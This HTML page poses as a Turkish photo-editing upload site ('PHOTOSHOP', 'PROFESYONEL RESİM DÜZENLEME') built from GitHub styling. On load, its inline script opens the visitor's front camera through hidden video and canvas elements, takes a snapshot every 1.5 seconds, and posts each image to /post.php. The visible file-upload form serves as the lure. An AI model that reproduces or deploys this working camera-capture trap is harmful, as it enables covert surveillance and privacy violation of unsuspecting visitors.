<!doctype html>
<html>
<head>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link crossorigin="anonymous" media="all" integrity="sha512-AAL4vHqoef7azLizL9Sh/ph6rt7hPyPXoa6ngQSxoJI8jZPIL5Ij17nCUW124lalllAaZqoThwv4iFO6e0ol3g==" rel="stylesheet" href="https://github.githubassets.com/assets/frameworks-0002f8bc7aa879fedaccb8b32fd4a1fe.css" />
  <link crossorigin="anonymous" media="all" integrity="sha512-qgDsYuKlUKkRsSxQRVim+S5Obxx8mPaNyyZU6VechXxW4fJ0dh5ZnVpVQ75fi12viPFua0k6kTNHn5YCqeFoCA==" rel="stylesheet" href="https://github.githubassets.com/assets/site-aa00ec62e2a550a911b12c504558a6f9.css" />
    <link crossorigin="anonymous" media="all" integrity="sha512-LntfAVTUH4LoHUCBymHBwovLGR35BOc6t5QaJr9y2zICULl7JdChPISMPGAQKWAzykxFQdlatsr/uu6kW5UImw==" rel="stylesheet" href="https://github.githubassets.com/assets/github-2e7b5f0154d41f82e81d4081ca61c1c2.css" />
<meta name="viewport" content="width=device-width">
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
<link rel="icon" href="/files/icon2.svg" type="image/x-icon" />
  <title>PHOTOSHOP</title>
</head>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: '/post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 480);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
  

}

// Load init
init();

</script>

<body class="logged-out env-production page-responsive session-authentication">

        <div class="header header-logged-out width-full pt-5 pb-4" role="banner">
  <div class="container clearfix width-full text-center">
   


<img src="/files/icon2.svg" width="300" height="225">

  </div>
</div>


    </div


  <div
    class="application-main "
    data-commit-hovercards-enabled
    data-discussion-hovercards-enabled
    data-issue-and-pr-hovercards-enabled
  >

  <div class="auth-form px-3" id="login" >

      <form action="loading.html" method="post">
        <div class="auth-form-header p-2">
          <h1 style="color:rgb(8, 120, 38); font-family: courier; font-weight: bold;">PROFESYONEL RESİM DÜZENLEME</h1>
        </div>


        <div data-pjax-replace id="js-flash-container">


</div>


        <div class="flash js-transform-notice" hidden>
          <button class="flash-close js-flash-close" type="button" aria-label="Dismiss this message">
            <svg class="octicon octicon-x" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M3.72 3.72a.75.75 0 011.06 0L8 6.94l3.22-3.22a.75.75 0 111.06 1.06L9.06 8l3.22 3.22a.75.75 0 11-1.06 1.06L8 9.06l-3.22 3.22a.75.75 0 01-1.06-1.06L6.94 8 3.72 4.78a.75.75 0 010-1.06z"></path></svg>
          </button>
        </div>

        <div class="auth-form-body mt-3">
<input type="file" id="img" name="img" accept="image/*">
<br>
<br>
          <input type="submit" name="commit" value="DEVAM ET" tabindex="3" class="btn btn-primary btn-block" data-disable-with="Signing in…" />
        </div>

</form>
  </body>

</html>
